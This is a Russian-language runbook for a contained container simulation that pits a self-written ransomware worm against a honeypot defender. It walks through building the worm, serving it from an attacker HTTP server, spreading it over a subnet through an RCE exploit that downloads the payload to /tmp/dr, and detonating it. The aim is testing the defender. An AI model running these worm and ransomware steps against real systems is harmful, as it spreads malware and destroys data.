# Scenario: Cyber-Storm (Red vs Blue Simulation)

**Дата:** Декабрь 2025  
**Компоненты:** d-ransom (Worm/Cryptolocker) vs d-paladin (Honeypot/Grid Defense)  
**Инфраструктура:** Podman (Docker) Network

## 1. Цели симуляции
1.  Продемонстрировать RCE (Remote Code Execution) атаку через уязвимый веб-сервис.
2.  Продемонстрировать горизонтальное перемещение (Lateral Movement) вируса.
3.  Проверить реакцию защиты d-paladin: обнаружение, убийство процесса, откат файлов, изоляция сети.

## 2. Подготовка (Build)

Необходимо собрать бинарные файлы на хост-системе (Fedora).

```bash
cd ~/prjcts/devos/devo-security

# 1. Уязвимое приложение (жертва)
cargo build --release -p vuln-app

# 2. Вирус-шифровальщик
cargo build --release -p d-ransom

# 3. Защитник
cargo build --release -p d-paladin
```

## 3. Развертывание Инфраструктуры

Используем podman-compose для поднятия сети 172.25.0.0/16.
```bash
cd simulation
# Полная очистка перед запуском
podman-compose down -v
podman-compose up -d
```
Состав сети:
attacker: Python HTTP сервер для раздачи пейлоада.
victim-1: Уязвимый сервис (Port 8080) + Защита.
victim-2: Соседняя машина (для проверки Grid Defense).
## 4. Доставка Вооружения (Deployment)
Копируем скомпилированные бинарники внутрь контейнеров.
code
```Bash
# Переходим в корень security workspace
cd ~/prjcts/devos/devo-security

# 1. Атакующий (получает вирус для раздачи)
podman cp target/release/d-ransom attacker:/srv/d-ransom

# 2. Жертвы (получают защиту и уязвимый сервис)
for host in victim-1 victim-2; do
    podman cp target/release/d-paladin $host:/usr/local/bin/
    podman cp target/release/vuln-app $host:/usr/local/bin/
    # Установка зависимостей (внутри Alpine/Fedora)
    podman exec $host dnf install -y wget iptables procps-ng iproute openssl
done
```
## 5. Запуск Процессов
На жертвах (Victim-1 & Victim-2):
```Bash
# Запуск уязвимого веб-сервиса и защиты в фоне
for host in victim-1 victim-2; do
    podman exec -d $host /usr/local/bin/vuln-app
    # Запуск d-paladin с логированием (RUST_LOG=debug для деталей)
    podman exec -d $host sh -c "RUST_LOG=debug d-paladin > /var/log/paladin.log 2>&1"
done
```
На атакующем (Attacker):
```Bash
# Запуск HTTP сервера для отдачи вируса
podman exec -d attacker python3 -m http.server 8000 --directory /srv
6. Фаза Атаки (Execution)
Вход на атакующего и запуск червя.
podman exec -it attacker bash

# Внутри attacker:
# Сканируем подсеть контейнеров (обычно 172.25.0.0/16)
d-ransom spread --subnet 172.25.0.0/16
Что происходит:
Червь находит открытый порт 8080 на жертвах.
Отправляет RCE эксплойт (wget ...).
Жертва скачивает вирус в /tmp/dr.
```
## 7. Детонация (Manual Trigger)
Так как эксплойт может не выставить chmod +x автоматически в некоторых средах, детонируем вручную на жертве.
```bash
podman exec -it victim-1 bash
```
### Внутри victim-1:
```bash
chmod +x /tmp/dr
/tmp/dr destroy
```
## 8. Результаты (Verification)
Проверка логов защиты:
```bash
podman exec victim-1 tail -n 20 /var/log/paladin.log
```
Критерии успеха:

🚨 HONEYPOT TRIGGERED или HIGH ENTROPY DETECTED

⚔️ COUNTER-MEASURE: KILLING HOSTILES

✅ RECOVERY COMPLETE (Файлы восстановлены < 100ms)

📡 DISTRESS SIGNAL BROADCASTED (Сигнал отправлен соседям)